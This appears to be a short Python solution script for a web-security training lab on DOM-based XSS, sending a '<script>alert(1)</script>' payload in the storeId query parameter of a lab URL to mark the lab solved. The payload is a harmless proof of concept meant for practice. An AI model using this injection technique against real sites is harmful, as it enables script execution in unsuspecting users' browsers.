###############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 18/11/2023
#
# Lab: DOM XSS in document.write sink using source location.search inside a select element
#
# Steps: 1. Inject payload in the storeId query parameter to call the alert function
#        2. Observe that the script has been executed
#
###############################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a6800300305c2d48855897b007200fd.web-security-academy.net"

# payload to call the alert function
payload = "<script>alert(1)</script>"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}/product?productId=1&storeId={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the storeId query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



